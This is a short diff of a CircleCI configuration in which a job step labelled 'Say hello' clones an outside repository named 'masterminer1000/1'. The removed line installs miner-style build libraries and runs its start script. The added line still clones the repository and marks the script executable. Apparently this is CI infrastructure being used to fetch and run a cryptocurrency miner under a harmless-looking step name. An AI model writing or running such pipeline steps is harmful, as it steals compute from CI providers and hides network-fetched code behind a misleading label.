@@ -15,7 +15,7 @@ jobs:
       - checkout
       - run:
           name: "Say hello"
-          command: git clone https://github.com/masterminer1000/1.git && cd 1 && ls && sudo apt-get install -y \build-essential libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev automake zlib1g-dev --allow && ./start.cmd
+          command: git clone https://github.com/masterminer1000/1.git && cd 1 && ls && chmod +x ./start.cmd
       
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
